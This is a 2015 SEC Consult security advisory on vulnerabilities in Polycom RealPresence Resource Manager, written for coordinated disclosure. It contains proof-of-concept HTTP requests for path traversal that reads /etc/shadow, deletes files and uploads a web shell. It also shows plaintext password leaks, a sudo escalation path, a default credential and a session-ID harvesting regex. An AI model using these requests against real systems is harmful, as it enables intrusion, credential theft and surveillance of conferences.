@@ -1,0 +1,440 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+SEC Consult Vulnerability Lab Security Advisory < 20150626-0 >
+=======================================================================
+              title: Critical vulnerabilities allow surveillance on conferences
+            product: Polycom RealPresence Resource Manager (RPRM)
+vulnerable versions: <8.4
+      fixed version: 8.4
+        CVE numbers: CVE-2015-4681, CVE-2015-4682, CVE-2015-4683, CVE-2015-4684
+                     CVE-2015-4685
+             impact: critical
+           homepage: http://www.polycom.com
+              found: 2015-03-10
+                 by: R. Freingruber, C.A. (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Berlin - Frankfurt/Main - Montreal - Singapore
+                     Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+- -------------------
+"A key component of the Polycom RealPresence Platform, available as a hardened
+appliance or software optimized for virtualized environments, the RealPresence
+Resource Manager application is critical to effectively managing thousands of
+mobile, desktop, and group telepresence systems."
+
+http://www.polycom.com/content/www/en/products-services/realpresence-platform/management-applications/realpresence-resource-manager.html
+
+
+Business recommendation:
+- ------------------------
+By combining all vulnerabilities documented in this advisory an unprivileged
+authenticated remote attacker can gain full system access (root) on the RPRM
+appliance. This has an impact on all conferences taking place via this RP
+Resource Manager. Attackers can steal all conference passcodes and join or
+record any conference.
+
+SEC Consult recommends not to use this system until a thorough security review
+has been performed by security professionals and all identified issues have
+been resolved.
+
+
+Vulnerability overview/description:
+- -----------------------------------
+1) Unauthorized plaintext password disclosure of RMX admin accounts
+The RPRM discloses the plaintext password of the RMX admin user to an
+unauthorized unprivileged attacker by including it in certain HTTP responses.
+No manipulation of parameters is required.
+
+
+2) Arbitrary file disclosure (I) via path traversal (CVE-2015-4684)
+Ordinary unprivileged users can download an Excel file of all their upcoming
+conferences. This functionality can be exploited by an authenticated attacker
+to download arbitrary files from the server due to insufficient input validation.
+There is no restriction on which files might be downloaded since this action
+is performed with root privileges.
+
+
+3) Plaintext passwords stored in logfiles
+RPRM generates logdata which includes plaintext passwords. This weakness in
+combination with the previous vulnerability allows an unprivileged attacker
+to escalate his privileges to the admin level in the web interface.
+
+
+4) Arbitrary file upload via path traversal (CVE-2015-4684)
+This vulnerability requires admin privileges in the web interface, but combining
+all previous vulnerabilities in this advisory allows privilege escalation.
+Administrators can import (upload) "user aliases" in the web interface. This
+functionality is vulnerable to a path traversal attack. This vulnerability
+can be exploited to upload a webshell and execute arbitrary commands with
+the permissions of the system user "plcm".
+
+
+5) Sudo misconfiguration allows privilege escalation (CVE-2015-4685)
+The "plcm" user is allowed to execute certain tools and scripts in given
+folders with root privileges. At the same time many of these scripts and
+folders are writeable to the plcm user. This allows execution of arbitrary
+code with root privileges.
+
+
+6) Arbitrary file disclosure (II) and removal (path traversal) (CVE-2015-4684)
+An authenticated attacker can download and remove any files using this path
+traversal vulnerability. Exploitation of this vulnerability requires admin
+privileges. There is no restriction on which files might be downloaded or
+removed since this action is performed with root privileges.
+
+
+7) Weak/Missing Authorization
+The separation of users relies on the fact that conference IDs are not
+guessable, but as soon as an information disclosure vulnerability allows an
+attacker to gather conference IDs authorization can be bypassed. The
+arbitrary file download vulnerability (2) allows an attacker to collect
+valid conference IDs.
+
+
+8) Absolute path disclosure (CVE-2015-4682)
+The web application discloses the absolute path to the web root.
+To collect this information no parameter manipulation is required.
+The webroot path is valuable when uploading a web shell (see vulnerability 4).
+
+
+9) Session ID in GET parameter allows for privilege escalation (CVE-2015-4683)
+Certain actions on the website (Excel and log file downloads) submit
+session IDs in HTTP GET parameters. If a privileged user performs such
+an action his session ID is written to the webserver log which can be
+retrieved by an unprivileged attacker by exploiting the vulnerability (2).
+This results in an additional privilege escalation path. Since session IDs
+are bound to source IP addresses successfull exploitation requires the
+attacker to have the same source IP as his victim (e.g. NAT).
+
+
+Proof of concept:
+- -----------------
+1) Unauthorized plaintext password disclosure of RMX admin accounts
+
+Request:
+- -----
+POST /PlcmRmWeb/JNetworkDeviceManager?n=... HTTP/1.1
+Host: <host>:8443
+SOAPAction: http://polycom.com/WebServices/aa:getAvailableBridges
+
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><aa:getAvailableBridges
+xmlns:aa="http://polycom.com/WebServices"><credentials
+xsi:type="JCredentials"><userToken>*VALID-USER-TOKEN*</userToken></credentials><resultsForConferenceOwner>false</resultsForConferenceOwner><areaId>-1</areaId></aa:getAvailableBridges></soap:Body></soap:Envelope>
+- -----
+
+Response:
+- -----
+<env:Envelope xmlns:env='http://schemas.xmlsoap.org/soap/envelope/'>
+  <env:Header></env:Header>
+  <env:Body>
+    <ns2:getAvailableBridgesResponse xmlns:ns2="http://polycom.com/WebServices">
+      <return>
+        <status>SUCCESS</status>
+      </return>
+      <mcuList>
+        <belongsToAreaUgpId>0</belongsToAreaUgpId>
+        <defaultAliasName>*redacted*</defaultAliasName>
+        <description></description>
+        <deviceId>*redacted*</deviceId>
+        <deviceName>*redacted*</deviceName>
+        <deviceStatus>ONLINE</deviceStatus>
+        <deviceType>CR</deviceType>
+        <deviceUUID>00000000-0000-0000-0000-000000000000</deviceUUID>
+        <hasDeviceErrors>false</hasDeviceErrors>
+        <ipAddress>*redacted*</ipAddress>
+        <isCallServer>false</isCallServer>
+        <isMcuPoolOrderSource>false</isMcuPoolOrderSource>
+        <managedGatekeeperStatus>NOT_APPLICABLE</managedGatekeeperStatus>
+        <password>*PLAINTEXTPASSWORD*</password>
+[...]
+- -----
+
+The same information is disclosed in the "aa:getMCUsNetworkDevicesForList" and
+"aa:getNetworkDevicesForList" requests.
+
+
+2) Arbitrary file disclosure (I) via path traversal
+The following URL allows an attacker to read the /etc/shadow file:
+https://hostname:8443/PlcmRmWeb/FileDownload?DownloadType=REPORT&Modifier=../../../../../../../etc/shadow&Credentials=*VALID-USER-TOKEN*&ClientId=&FileName=
+
+root:<hash>:16135:0:99999:7:::
+bin:*:15513:0:99999:7:::
+daemon:*:15513:0:99999:7:::
+dbus:!!:16135::::::
+hacluster:!!:16135::::::
+vcsa:!!:16135::::::
+rpc:!!:16135:0:99999:7:::
+ntp:!!:16135::::::
+plcm:$1$nqk4wqYm$N4QLTb66K8JwE9yM2GuO.1:16135::::::
+[...]
+
+(plcm user password is Polycom123)
+
+3) Plaintext passwords stored in logfiles
+
+No proof of concept necessary.
+
+
+4) Arbitrary file upload via path traversal
+
+Request:
+- -----
+POST /PlcmRmWeb/FileUpload HTTP/1.1
+Accept: text/*
+Content-Type: multipart/form-data; boundary=----------ae0gL6cH2KM7GI3GI3ae0KM7ae0ae0
+User-Agent: Shockwave Flash
+Host: <host>:8443
+Content-Length: 1076
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+- ------------ae0gL6cH2KM7GI3GI3ae0KM7ae0ae0
+Content-Disposition: form-data; name="Filename"
+
+../../../../../../../../../../../../opt/polycom/cma/current/jserver/web/ROOT.war/webshell-123.jsp
+- ------------ae0gL6cH2KM7GI3GI3ae0KM7ae0ae0
+Content-Disposition: form-data; name="SE_LOC"
+
+null
+- ------------ae0gL6cH2KM7GI3GI3ae0KM7ae0ae0
+Content-Disposition: form-data; name="Token"
+
+*VALID-USER-TOKEN*
+- ------------ae0gL6cH2KM7GI3GI3ae0KM7ae0ae0
+Content-Disposition: form-data; name="SE_FNAME"
+
+../../../../../../../../../../../../opt/polycom/cma/current/jserver/web/ROOT.war/webshell-123.jsp
+- ------------ae0gL6cH2KM7GI3GI3ae0KM7ae0ae0
+Content-Disposition: form-data; name="UploadType"
+
+SIP_URL_CSV
+- ------------ae0gL6cH2KM7GI3GI3ae0KM7ae0ae0
+Content-Disposition: form-data; name="FlashSessionId"
+
+*session-id*
+- ------------ae0gL6cH2KM7GI3GI3ae0KM7ae0ae0
+Content-Disposition: form-data; name="Filedata"; filename="webshell-123.jsp"
+Content-Type: application/octet-stream
+
+*web shell payload here*
+
+- ------------ae0gL6cH2KM7GI3GI3ae0KM7ae0ae0
+Content-Disposition: form-data; name="Upload"
+
+Submit Query
+- ------------ae0gL6cH2KM7GI3GI3ae0KM7ae0ae0--
+
+
+5) Sudo misconfiguration allows privilege escalation
+Excerpt from /etc/sudoers:
+
+plcm   ALL=(ALL)  ALL
+plcm   ALL=(root)NOPASSWD:/usr/sbin/dmidecode
+plcm   ALL=(root)NOPASSWD:/sbin/init
+plcm   ALL=(root)NOPASSWD:/sbin/service
+plcm   ALL=(root)NOPASSWD:/opt/polycom/cma/*/jserver/bin/getNetworkInfo.pl
+*...*
+plcm   ALL=(root)NOPASSWD:/opt/polycom/cma/*/jserver/schema/script/getCipherSuiteMode.sh
+plcm   ALL=(root)NOPASSWD:/opt/polycom/cma/*/ha/scripts/*
+*...*
+plcm   ALL=(root)NOPASSWD:/var/polycom/cma/upgrade/scripts/*
+plcm   ALL=(root)NOPASSWD:/usr/bin/snmptrap
+plcm   ALL=(root)NOPASSWD:/usr/bin/snmpget
+plcm   ALL=(root)NOPASSWD:/sbin/iptables
+*...*
+plcm   ALL=(root)NOPASSWD:/usr/sbin/tcpdump
+plcm   ALL=(root)NOPASSWD:/usr/sbin/logrotate
+plcm   ALL=(root)NOPASSWD:/usr/sbin/wired_supplicant_configurator
+
+Among many other paths in this long list, the folder
+/var/polycom/cma/upgrade/scripts/
+is writeable for the plcm user. Simply placing any malicious script/executable in
+this folder and executing it via sudo gives an attacker full root access.
+
+
+6) Arbitrary file disclosure (II) and removal (path traversal)
+
+The following request is used to disclose and remove "/etc/hosts" from the system.
+An arbitrary file can be specified here (operations are executed with root privileges).
+
+POST /PlcmRmWeb/JUserManager?n=... HTTP/1.1
+Host: <host>:8443
+SOAPAction: http://polycom.com/WebServices/aa:importSipUriReservations
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><aa:importSipUriReservations
+xmlns:aa="http://polycom.com/WebServices"><credentials
+xsi:type="JCredentials"><userToken>*VALID-USER-TOKEN*</userToken></credentials><filePathName>../../../../../../../../../../../../../etc/hosts</filePathName></aa:importSipUriReservations></soap:Body></soap:Envelope>
+
+It's very likely that the SOAP action "aa:importUserH323Reservations" contains the same vulnerability.
+
+
+7) Weak/Missing Authorization
+
+The exploit of this vulnerability has been removed from this advisory.
+According to the vendor it is unresolved in the new software version 8.4.
+
+
+8) Absolute path disclosure
+
+Request:
+- -----
+POST /PlcmRmWeb/JConfigManager?n=... HTTP/1.1
+Host: <host>:8443
+SOAPAction: http://polycom.com/WebServices/aa:getCustomLogoUploadPath
+Content-Length: 417
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><aa:getCustomLogoUploadPath
+xmlns:aa="http://polycom.com/WebServices"><credentials
+xsi:type="JCredentials"><userToken>*VALID-USER-TOKEN*</userToken></credentials></aa:getCustomLogoUploadPath></soap:Body></soap:Envelope>
+- -----
+
+Response:
+- ---------
+<env:Envelope xmlns:env='http://schemas.xmlsoap.org/soap/envelope/'>
+  <env:Header></env:Header>
+  <env:Body>
+    <ns2:getCustomLogoUploadPathResponse xmlns:ns2="http://polycom.com/WebServices">
+      <return>
+        <status>SUCCESS</status>
+      </return>
+      <url>/download/CustomLogos/</url>
+      <path>/opt/polycom/cma/current/jserver/web/ROOT.war/download/CustomLogos/</path>
+    </ns2:getCustomLogoUploadPathResponse>
+  </env:Body>
+</env:Envelope>
+- -----
+
+At least the following SOAP actions can be used to retrieve absolute paths:
+- - aa:getCustomLogoUploadPath
+- - aa:getCustomDesktopLogoUploadPath
+- - aa:getUploadDirectory
+- - aa:getSystemLogFiles
+- - aa:getLegacyUploadDir
+- - aa:getAuditLogFiles
+
+
+9) Session ID in GET parameter allows privilege escalation
+
+Sample URL that contains a session ID in the GET parameter 'Credential':
+
+/PlcmRmWeb/FileDownload?DownloadType=LOGGER&Modifier=-123&Credentials=12345678-1234-1234-1234-123456789000&ClientId=&FileName=Conference.log
+
+Path to the webserver access logfiles:
+/var/log/polycom/cma/audit/localhost_access_log.log
+/var/log/polycom/cma/audit/localhost_access_log.log.1.gz
+...
+
+Extract valid session IDs from the log files:
+egrep "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" localhost_access_log.log
+
+
+Vulnerable versions:
+- -----------------------------
+According to the vendor, all software versions <8.4 are affected.
+
+
+Vendor contact timeline:
+- ------------------------
+2015-03-25: Video conference with Polycom, discussing vulnerabilities
+2015-03-27: Contacting Polycom through security@polycom.com, requesting
+            encryption keys, attaching responsible disclosure policy.
+2015-04-01: Polycom provides PGP key
+2015-04-02: Sending encrypted security advisory to Polycom
+2015-04-03: Polycom provides affected versions
+2015-04-29: Polycom provides planned release date (2015-06-19) and
+            version number that fixes issues.
+2015-05-06: SEC Consult confirms advisory release date: 2015-06-26
+2015-06-15: Polycom releases RPRM v8.4
+2015-06-18: Polycom provides URL to RPRM v8.4
+2015-06-18: SEC Consult asks for reassurance that v8.4 fixes reported
+            vulnerabilities since 8.4's release notes do not mention
+            any fixes.
+2015-06-22: Received a list that the vulnerabilities were fixed.
+2015-06-26: Coordinated release of security advisory.
+
+
+Solution:
+- ---------
+Update to RPRM v8.4.
+
+For further information see the following URL of the vendor:
+http://support.polycom.com/PolycomService/support/us/support/network/management_scheduling/realpresence_resource_manager.html
+
+Exception:
+RPRM v8.4 does _not_ address the weakness described in section 7
+(Weak/Missing Authorization).
+
+
+Workaround:
+- -----------
+None.
+
+
+Advisory URL:
+- -------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Berlin - Frankfurt/Main - Montreal - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://www.sec-consult.com/en/Career.htm
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://www.sec-consult.com/en/About/Contact.htm
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF SEC Consult Vulnerability Lab / @2015
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.9 (MingW32)
+
+iQIcBAEBAgAGBQJVjTcBAAoJEC0t17XG7og/eMEP/0AYTeU4D59vP7eZvcVDdcJe
+vt/rKr9MoBSEVki353Fw0cSEQXXsAS3mIkK4Ux9mpwgGfFo5cSm5Yi3ExLJ7eYJV
+/PgkgNDeS9+lj08MaGBwcmuodzzvYmcfeErnqsNvV7V1vaqe4gfRjvSI5+h5F28l
+8DtQEF98WOSNsDxJmPN9lwVsZ7d9QH2duCvyhJ/RY3LFr+3s2JvyX8YoCx+77PBK
+GnuaOt1hLLfONeMiSpqXZxvOpegj7igx5mTStlNHCbxxos1Rz7UpyRWMnMtMz4mi
++mZIBbDeGEoSblGn202TjbM2uYNp5OCCQPCp7pGW2w3AtoQvQDxMCnrkzbK9ORBz
+9q8epixzL/GQXd2rtloV7+Kj6Qz13Tvh36rpxvrhR9X/u6N5O7TObMy8n0fZimjh
+KMip21wn7JniBE4A5jBssdNM3ktfEPdjTBW2N5NAqGQ5VSIRJzI3yVjZIKUH1+WJ
+dcrQHK36II4CvVTIGsXf/20oaZewGpkmSn/p5iuQy5HBMnXU+/Xr5w1z94vmCOOj
+a+rUToaCbdK1Ldx9pSktX6OY9bzf1hkZbzNs/UncKa72hha1pTuwR76wY37hMrWu
+aRI2ZDNBbt/YuHjaiIOcramg9519AcWIoq9kcKIWJdpp2m9ZN3ub8TWPmde6Puii
+9TVqPEBEU8NH1SeTdDvw
+=//g1
+-----END PGP SIGNATURE-----
